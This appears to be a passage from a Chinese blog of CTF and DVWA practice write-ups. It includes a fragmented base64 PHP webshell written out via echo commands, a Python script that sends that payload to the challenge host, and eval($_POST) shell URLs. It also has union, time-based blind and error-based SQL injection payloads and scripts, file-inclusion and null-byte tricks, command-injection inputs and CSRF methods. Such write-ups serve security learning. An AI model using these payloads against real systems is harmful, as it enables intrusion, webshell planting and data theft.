<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1.</span>p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">sh _</span><br><span class="line">sh y</span><br></pre></td></tr></table></figure>

<p>脚本访问</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://86568f48.yunyansec.com/?1=&#123;0&#125;&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="string">&quot;[*]&quot;</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://86568f48.yunyansec.com/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后就可以查看信息了</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=phpinfo();</span><br></pre></td></tr></table></figure>

<p>连接蚁剑的话要构造一个post</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>在上一级的key可以找到flag{a1c8BFF2}</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>BugkuCTF-WEB</title>
    <url>/2020/03/26/BugkuCTF-WEB/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>最近把bugku的基础web题都刷完了。里面有大概10道题都不能访问。这里记录一下解题的过程。</p>
<h5 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a><strong>备份是个好习惯</strong></h5><p>题目提示：听说备份是个好习惯。</p>
<p>于是试着加入后缀<strong>index.php.bak</strong>，然后看到提示下载。然后打开下载的备份文件看到：</p>
<img src="http://img.kawhi.xyz/image-20200322105903654.png" alt="image-20200322105903654" style="high:80%;width:80%;" />

<p>就是要传入的两个值的md5相等，但是两个值不相等。</p>
<p><strong>解决方式一：</strong>md5函数无法处理数组，如果传入数组会返回NULL。构造url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kkeyey1[]=1&amp;kkeyey2[]=2</span><br></pre></td></tr></table></figure>

<p><strong>解决方式二：</strong>如果字符经过md5加密后的值为0exx的形式，会被认为是科学计数法，且表示0*10的xxxx次方，还是零。构造url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure>

<h5 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a><strong>变量1</strong></h5><p>打开网页看到</p>
<img src="http://img.kawhi.xyz/image-20200322104141287.png" alt="image-20200322104141287" style="high:80%;width:80%;" />

<p>题目已经通过正则表达式对$args进行了过滤，但是这里可以使用超全局变量$GLOBALS。</p>
<p>因为PHP在$GLOBALS[index]数组中储存了所有全局变量，变量的名字就是数组的键。</p>
<p>构造url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure>

<h5 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a><strong>flag在index里</strong></h5><p>打开页面如下：</p>
<img src="http://img.kawhi.xyz/image-20200320140041305.png" alt="image-20200320140041305" style="high:80%;width:80%;" />

<p>看到file知道应该是文件包含漏洞，但不知道如何下手，看wp之后知道可以用PHP内置协议php://filter</p>
<p>构造url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>可以看到通过base64加密后的源码已经爆出,解密,得到flag。</p>
<h5 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a><strong>成绩单</strong></h5><p>打开网页如下：</p>
<img src="http://img.kawhi.xyz/image-20200322144603485.png" alt="image-20200322144603485" style="high:80%;width:80%;" />

<p>一开始我就觉得是sql注入，但是还是没有做出来，然后看了wp觉得好简单。</p>
<p>查数据库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,database()--</span></span><br></pre></td></tr></table></figure>

<p>查表名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,table_name from information_schema.tables where table_schema=&#x27;</span>skctf_flag<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>

<p>查字段名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;</span>fl4g<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure>

<p>查内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,skctf_flag from fl4g--</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h5 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a><strong>秋名山老司机</strong></h5><p>打开网页看到如下：</p>
<img src="http://img.kawhi.xyz/image-20200322165647628.png" alt="image-20200322165647628" style="high:80%;width:80%;" />

<p>本题要求计算响应内容中的表达式并用 POST 请求返回结果，但是必须在两秒之内完成。所以靠手工的方法是做不到的。这里可以利用python里面的request写一个脚本。详情可参考：<a style="text-decoration:none;" class="foo" target="_blank" href="https://ciphersaw.me/2017/12/16/详解 CTF Web 中的快速反弹 POST 请求/">传送门</a></p>
<p>脚本如下：</p>
<img src="http://img.kawhi.xyz/image-20200322201254499.png" alt="image-20200322201254499" style="high:80%;width:80%;" />

<p>这里的会话对象 Session() 能够在多次请求中保持参数，然后是引入 re 模块，其次用 search() 正则匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。获得算术表达式的字符串后，直接利用 Python 的內建方法 <a href="https://docs.python.org/3/library/functions.html#eval">eval()</a> 来计算出结果。然后运行脚本就可得到flag。</p>
<h5 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a><strong>速度要快</strong></h5><p>打开网页如下：</p>
<img src="http://img.kawhi.xyz/image-20200322212200486.png" alt="image-20200322212200486" style="high:80%;width:80%;" />

<p>然后查看响应头和网页的源代码发现：</p>
<img src="http://img.kawhi.xyz/image-20200322212837581.png" alt="image-20200322212837581" style="high:80%;width:80%;" />

<p>应该是要提交以margin为key，flag里的值为value然后以post的方式提交数据。但是有一个问题就是手动提交没成功，查看wp发现和秋名山老司机那一题是差不多的。他的flag是不断在变的。所以需要写一个脚本来得到flag。</p>
<img src="http://img.kawhi.xyz/image-20200322213958769.png" alt="image-20200322213958769" style="high:80%;width:80%;" />

<h5 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a><strong>cookie欺骗</strong></h5><p>打开网页发现：</p>
<img src="http://img.kawhi.xyz/image-20200323114059871.png" alt="image-20200323114059871" style="high:80%;width:80%;" />

<p>这里把filename后面的字符串base64解码后发现是keys.txt。然后试着把index.php传上去，这里需要base64编码后再上传。然后line的值输入数字之后发现出现一行一行的代码，这里可以写个脚本把所有的代码显示出来。</p>
<img src="http://img.kawhi.xyz/image-20200323115824785.png" alt="image-20200323115824785" style="high:80%;width:80%;" />

<p>分析源码，前面判断传参，后面判断cookie必须满足margin=margin才能访问keys.php。</p>
<img src="http://img.kawhi.xyz/image-20200323120059198.png" alt="image-20200323120059198" style="high:80%;width:80%;" />

<h5 id="Never-give-up"><a href="#Never-give-up" class="headerlink" title="Never give up"></a><strong>Never give up</strong></h5><p>打开网页如下所示：</p>
<img src="http://img.kawhi.xyz/image-20200323212638319.png" alt="image-20200323212638319" style="high:80%;width:80%;" />

<p>发现源代码里面有一个1p.html，但是直接访问这个的话是会跳转到官网里面。所以使用burp suite抓包，然后经过一系列的编码后发现一段php的代码。</p>
<img src="http://img.kawhi.xyz/image-20200324095112996.png" alt="image-20200324095112996" style="high:80%;width:80%;" />

<p>这里其实直接打开<a href="http://123.206.87.240:8006/test/f4l2a3g.txt%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97flag%E4%BA%86%E3%80%82%E4%BD%86%E6%98%AF%E7%9C%8Bwp%E4%B9%8B%E5%90%8E%E6%9C%89%E4%BA%BA%E8%AF%B4%E5%8F%AF%E8%83%BD%E6%98%AF%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E5%A4%B1%E8%AF%AF%E3%80%82%E6%89%80%E4%BB%A5%E8%BF%98%E6%9C%89%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%E3%80%82">http://123.206.87.240:8006/test/f4l2a3g.txt即可获得flag了。但是看wp之后有人说可能是出题人的失误。所以还有另外一种解法。</a></p>
<p>第1行：限制 URL 查询字符串中必须有非空非零变量<font color=#DC143C>id</font></p>
<p>这里弱类型比较的时候，字符串是等于0的。</p>
<p>弱类型比较详情：<a style="text-decoration:none;" class="foo" target="_blank" href="https://www.php.net/manual/zh/types.comparisons.php">传送门</a></p>
<p>第9行：限制变量<font color=#DC143C>$a</font>中不能含有字符<code>.</code></p>
<p>第15行：要满足以下 5 条表达式才会爆 flag：</p>
<ul>
<li>变量<font color=#DC143C>$data</font>弱等于字符串<font color=#DC143C>bugku is a nice plateform!</font>。</li>
</ul>
<p>这里的变量<code>$data</code>是由<code>file_get_contents()</code>函数读取的，所以直接给a赋值是不行的，这里要用伪协议  <code>php://</code>  来访问输入输出的数据流。其中<code>php://input</code> 可以访问原始请求数据中的只读流。这里令 <code>$a = &quot;php://input&quot;</code>，并在请求主体中提交字符串 <code>bugku is a nice plateform!</code>。</p>
<p>有关 PHP 伪协议的详情：<a style="text-decoration:none;" class="foo" target="_blank" href="https://www.php.net/manual/zh/wrappers.php">传送门</a></p>
<ul>
<li>变量<font color=#DC143C>$id</font>弱等于整型数0</li>
<li>变量<font color=#DC143C>$b</font>的长度大于5</li>
<li>字符串<font color=#DC143C>1114</font> 要与字符串 <font color=#DC143C>111</font> 连接变量 <font color=#DC143C>$b</font> 的第一个字符构成的正则表达式匹配。</li>
</ul>
<p><code>ereg()</code> 函数或 <code>eregi()</code> 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</p>
<p>源码中待匹配字符串（第二个参数）已确定为 <code>&quot;1114&quot;</code>，正则表达式（第一个参数）由 <code>&quot;111&quot;</code> 连接 <code>$b</code> 的第一个字符组成，若令 <code>substr($b,0,1) = &quot;\x00&quot;</code>，即满足 <code>&quot;1114&quot;</code> 与 <code>&quot;111&quot;</code> 匹配。因此，这里假设 <code>$b = &quot;\x0012345&quot;</code>，才能满足以上三个条件。</p>
<ul>
<li>变量 <font color=#DC143C>$b</font> 的第一个字符弱不等于整型数 <font color=#DC143C>4</font></li>
</ul>
<p>构造payload后爆出flag</p>
<p>这里要注意的是在构造变量 <code>b</code> 中的空字符时，过早将空字符 <code>\x00</code> 放入，在提交请求时导致请求头截断，继而请求失败，得不到响应。因为 <code>b</code> 是 URL 查询字符串中的变量，不应该在此放入空字符 <code>\x00</code>，而应该为空字符的 URL 编码 <code>%00</code>。</p>
<img src="http://img.kawhi.xyz/image-20200324155132388.png" alt="image-20200324155132388" style="high:80%;width:80%;" />

<h5 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a><strong>字符？正则？</strong></h5><img src="http://img.kawhi.xyz/image-20200325174427232.png" alt="image-20200325174427232" style="high:80%;width:80%;" />

<p>题目如上：可以看出只要我们构造出符合正则表达式的字符串通过GET传参就可以看到flag。所以首先要分析这个正则。</p>
<p><strong>定界符：</strong>/和/ 一般来说是这两个。</p>
<p><strong>. （一个点）：</strong>表示可以匹配任何字符。</p>
<p><strong>{n,m} ：</strong>前面的字符重复4~7次。</p>
<p><strong>\ （反斜线）：</strong>后面的字符被转义。</p>
<p><strong>[a-z] ：</strong>在a到z中匹配。</p>
<p><strong>[[:punct:]] ：</strong>匹配任何标点符号。</p>
<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感。</p>
<p>这里我构造的payload为：key1key11111key:/1/1keya&gt;</p>
<p>通过get传参即可得到flag。</p>
<h5 id="web8"><a href="#web8" class="headerlink" title="web8"></a><strong>web8</strong></h5><p>题目如下：</p>
<img src="http://img.kawhi.xyz/image-20200325183547450.png" alt="image-20200325183547450" style="high:80%;width:80%;" />

<p>首先分析一下这个题目：</p>
<p>ac变量不为空，fn要用php://input读取，和前面的题目有一些类似</p>
<img src="http://img.kawhi.xyz/image-20200325183817128.png" alt="image-20200325183817128" style="high:80%;width:80%;" />

<p>这道题是自己做出来的flag，虽然题目简单，还是挺开心的，终于不用看wp了。</p>
<h5 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a><strong>求getshell</strong></h5><p>题目如下</p>
<img src="http://img.kawhi.xyz/image-20200325203204296.png" alt="image-20200325203204296" style="high:80%;width:80%;" />

<p>用burpsuite抓包后改这三个地方即可得到flag</p>
<img src="http://img.kawhi.xyz/image-20200325203355071.png" alt="image-20200325203355071" style="high:80%;width:80%;" />

<p>没想到是这样就得出flag，一开始我只改了下面两个箭头，还拿菜刀在那里连个半天。</p>
<h5 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a><strong>INSERT INTO注入</strong></h5><img src="http://img.kawhi.xyz/image-20200326201031090.png" alt="image-20200326201031090" style="high:80%;width:80%;" />

<p>题目直接给出了源代码，并且告知要写python脚本。</p>
<p>这里用explode函数将字符串转换成数组，并且是根据逗号分割的。所以这里</p>
<p>if(expr1,expr2,expr3)这个函数就用不了了，这里可以用这个代替。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select case when xxx then xxx <span class="keyword">else</span> xxx end</span><br></pre></td></tr></table></figure>

<p>同时substr(database(),1,1)等同于substr(database() from 1 for 1)</p>
<p><strong>查数据库名：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">mystring = string.ascii_letters+string.digits</span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span></span><br><span class="line">data = <span class="string">&quot;1&#x27; and (select case when (substr(database() from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> mystring:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">&#x27;x-forwarded-for&#x27;</span>:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;The final flag:&#x27;</span>+flag</span><br></pre></td></tr></table></figure>

<p>跑出的结果是web15。timeout的值可以大一些比如4，5。结果会更加准确。</p>
<p><strong>查表名：</strong></p>
<p>把上述代码database()换成如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>

<p>跑出的结果是clientipflag。</p>
<p><strong>查字段名：</strong></p>
<p>把上述代码database()换成如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;flag&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来的结果是flag。</p>
<p><strong>查内容：</strong></p>
<p>把上述代码database()换成如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(select flag <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure>

<p>跑出来的结果是cdbf14c9551d5be5612f7bb5d2867853。</p>
<h5 id="多次"><a href="#多次" class="headerlink" title="多次"></a><strong>多次</strong></h5><p>题目的url为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:9004/1ndex.php?id=1</span><br></pre></td></tr></table></figure>

<p>id=5的时候，页面提示You can do some SQL injection in here.</p>
<p>说明是一道注入题。这时候id输入<font color="red">1’</font>页面报错，继续输入<font color="red">1’–+</font>没有报错，再输入<font color="red">1’ and 1=1–+</font>却报错了，说明and应该是被过滤了。</p>
<p>这里可以使用<strong>异或注入</strong>来判断过滤了什么字符。</p>
<p>在id=1后面输入<font color="red">‘^(0)^’</font></p>
<p>如果括号里面为0的话，整体为1，页面显示正确。括号里面为1，整体为0，页面显示错误。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;^(length(&#x27;and&#x27;)!=0)^&#x27;</span><br></pre></td></tr></table></figure>

<p>如果输入上面的字符，而页面显示正确的话，就说明and被过滤了。</p>
<p>经过测试，发现union,select,or,and都被过滤了。from没有被过滤。</p>
<p>这时候就可以构造url查数据库，查表，查字段，查内容了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,database()--+</span><br><span class="line"><span class="comment">#web1002-1</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;web1002-1&#x27;--+</span><br><span class="line"><span class="comment">#flag1,hint</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag1&#x27;--+</span><br><span class="line"><span class="comment">#flag1,address</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,select flag1 from flag1--+</span><br><span class="line"><span class="comment">#usOwycTju+FTUUzXosjr</span></span><br></pre></td></tr></table></figure>

<p>然后查address的时候发下还有下一关。</p>
<p>然后发现union,sleep,substr被过滤，select,or,and,from没有被过滤。</p>
<p>但是双写无法绕过，大小写无法绕过。</p>
<p>这里可以使用updatexml报错注入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line"><span class="comment">#web1002-2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;web1002-2&#x27;  limit 1),0x7e),1)--+</span><br><span class="line"><span class="comment">#class,flag2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag2&#x27; ),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag2,address</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag&#123;Bugku-sql_6s-2i-4t-bug&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a><strong>flag.php</strong></h5><img src="http://img.kawhi.xyz/image-20200331150635411.png" alt="image-20200331150635411" style="high:80%;width:80%;" />

<p>打开发现如上：</p>
<p>底下还有一段：</p>
<img src="http://img.kawhi.xyz/image-20200331150809369.png" alt="image-20200331150809369" style="high:80%;width:80%;" />

<p>应该迷惑的，KEY的值是0。上面并没有定义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">print_r(serialize(<span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:0:&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后传参cookie即可：ISecer=s:0:””</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>DVWA练习Ⅰ</title>
    <url>/2020/03/14/DVWA%E7%BB%83%E4%B9%A0%E2%85%A0/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>DVWA是一款开源的渗透测试漏洞练习平台,分别有不同的练习板块，如暴力破解，CSRF，文件包含和上传漏洞，以及SQL注入漏洞，XSS等等。还分别有低中高难度可以选择。</p>
<h5 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a><strong>暴力破解</strong></h5><h6 id="low等级"><a href="#low等级" class="headerlink" title="low等级"></a>low等级</h6><p>界面如下，是一个输入用户名和密码的文本框</p>
<img src="http://img.kawhi.xyz/image-20200314104652827.png" alt="image-20200314104652827" style="high:80%;width:80%;" />

<p>这里直接用burp suite去破解他的密码，结果如下：</p>
<img src="http://img.kawhi.xyz/image-20200314104812871.png" alt="image-20200314104652871" style="high:80%;width:80%;" />

<p>这里查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200314105302160.png" alt="image-20200314105302160" style="high:80%;width:80%;" />

<p>发现没有任何防止爆破的机制</p>
<p>而且存在sql注入漏洞，也可以输入admin’#即可成功登录</p>
<img src="http://img.kawhi.xyz/image-20200314110629085.png" alt="image-20200314110629085" style="high:80%;width:80%;" />

<h6 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>先查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200314110942887.png" alt="image-20200314110942887" style="high:80%;width:80%;" />

<blockquote>
<p>发现比low等级多了两行，箭头所示</p>
<p>这个函数基本防止了SQL的注入</p>
<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符</p>
<p>但是依然没有加入有效的防爆破，爆破方式和low等级一样</p>
</blockquote>
<h6 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h6><p>通过抓包可以发现登录的时候提交了四个参数</p>
<img src="http://img.kawhi.xyz/image-20200314111842212.png" alt="image-20200314111842212" style="high:80%;width:80%;" />

<blockquote>
<p>这样就要求我们发送的每个请求包中包含随机生成的token值。我们无法简单的使用Burpsuite完成</p>
<p>看网上说可以用python脚本抓取每次返回的user_token，这里我没去试了，实力劝退</p>
</blockquote>
<h6 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><p>先查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200314112505889.png" alt="image-20200314112505889" style="high:80%;width:80%;" />

<blockquote>
<p>可以看到Impossible级别的代码加入了可靠的防爆破机制</p>
<p>一旦错误次数达到3次，就会锁定用户15秒</p>
</blockquote>
<h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h5><h6 id="low等级-1"><a href="#low等级-1" class="headerlink" title="low等级"></a>low等级</h6><img src="http://img.kawhi.xyz/image-20200314112821092.png" alt="image-20200314112821092" style="high:80%;width:80%;" />

<p>这里我们随便输入一下127.0.0.1&amp;&amp;ipconfig</p>
<img src="http://img.kawhi.xyz/image-20200314114952634.png" alt="image-20200314114952634" style="high:80%;width:80%;" />

<p>可以发现low等级对ip的参数没有做任何的过滤</p>
<h6 id="Medium等级-1"><a href="#Medium等级-1" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>先查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200314115219862.png" alt="image-20200314115219862" style="high:80%;width:80%;" />

<blockquote>
<p>发现相比于Low等级的代码，服务器端对ip参数做了一定过滤，把”&amp;&amp;” 、”；”替换为空；本质上是添加了黑名单机制，依旧存在安全问题。</p>
<p>这里可以使用&amp;或者|，或者用绕过的方式如&amp;;&amp;</p>
</blockquote>
<h6 id="High等级-1"><a href="#High等级-1" class="headerlink" title="High等级"></a>High等级</h6><p>查看一下源代码</p>
<img src="http://img.kawhi.xyz/image-20200314120028803.png" alt="image-20200314120028803" style="high:80%;width:80%;" />

<blockquote>
<p>发现过滤了如上的字符，但是箭头所示的地方是将“| ”替换为空，并不是“|”，所以这里可以直接输入127.0.0.1|ipconfig即可</p>
</blockquote>
<h6 id="Impossible等级-1"><a href="#Impossible等级-1" class="headerlink" title="Impossible等级"></a>Impossible等级</h6><img src="http://img.kawhi.xyz/image-20200314120450931.png" alt="image-20200314120450931" style="high:80%;width:80%;" />

<blockquote>
<p>可以看到这里不仅加入了token,而且同时对参数ip进行了限制，只有数字才可执行，彻底杜绝了命令注入漏洞。</p>
</blockquote>
<h5 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h5><blockquote>
<p>csrf指的是跨站请求伪造，是指利用受害者未失效的身份认证信息（cookie，会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下，以受害者的身份向服务器发送请求，从而完成非法操作。</p>
<p>基本的流程如下：</p>
<p>①用户首先登录服务器<br>②服务器返回cookie<br>③然后攻击者将修改用户密码的URL发给用户<br>④用户如果点击了该URL，则密码就会被更改<br>⑤最后，攻击者使用用户的用户名和密码尝试进行登录服务器。如果成功，则证明用户点过url，如果没有登录成功，则用户没有点击url。</p>
</blockquote>
<h6 id="low等级-2"><a href="#low等级-2" class="headerlink" title="low等级"></a>low等级</h6><p>查看他的源码</p>
<img src="http://img.kawhi.xyz/image-20200314122002750.png" alt="image-20200314122002750" style="high:80%;width:80%;" />

<blockquote>
<p>发现用了上面暴力破解的函数，即过滤了SQL的特殊字符</p>
<p>但是并没有任何的防CSRF机制</p>
</blockquote>
<p>这里可以使用几种不同的方式进行伪造</p>
<p><strong>方式一：构造修改密码的链接</strong></p>
<p>这里抓包试一下，并修改链接后重新发包</p>
<img src="http://img.kawhi.xyz/image-20200314123419806.png" alt="image-20200314123419806" style="high:80%;width:80%;" />

<blockquote>
<p>有个问题就是：这个链接一眼就能看出来这个链接是改密码的，而且在点击了这个链接后，页面就会显示密码已修改。显然不太好</p>
</blockquote>
<p><strong>方式二：构造攻击页面</strong></p>
<img src="http://img.kawhi.xyz/image-20200314124625220.png" alt="image-20200314124625220" style="high:80%;width:80%;" />

<blockquote>
<p>如图所示，在本地写一个1.html，然后诱导受害者去点击，点击之后就直接修改密码为4444，而且是以img的方式，显然这种方法比第一种更加隐蔽。</p>
</blockquote>
<p><strong>方式三：结合存储型XSS进行重定向</strong></p>
<img src="http://img.kawhi.xyz/image-20200314125648840.png" alt="image-20200314125648840" style="high:80%;width:80%;" />

<blockquote>
<p>因为是存储型xss，所以写入之后每次访问xss都会直接重定向1.html页面</p>
<p>结果也发现密码成功修改</p>
</blockquote>
<h6 id="Medium等级-2"><a href="#Medium等级-2" class="headerlink" title="Medium等级"></a>Medium等级</h6><p>查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200314141947325.png" alt="image-20200314141947325" style="high:80%;width:80%;" />

<blockquote>
<p>Medium级别的代码使用 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，即要求本地登录），希望通过这种机制抵御CSRF攻击。</p>
</blockquote>
<p>如果使用上面的方式二或者三就会失效，这里可以把1.html再放进包含本地ip地址的文件夹中即可</p>
<img src="http://img.kawhi.xyz/image-20200314143922825.png" alt="image-20200314143922825" style="high:80%;width:80%;" />

<h6 id="High等级-2"><a href="#High等级-2" class="headerlink" title="High等级"></a>High等级</h6><p>查看一下源码</p>
<img src="http://img.kawhi.xyz/image-20200314164900286.png" alt="image-20200314164900286" style="high:80%;width:80%;" />

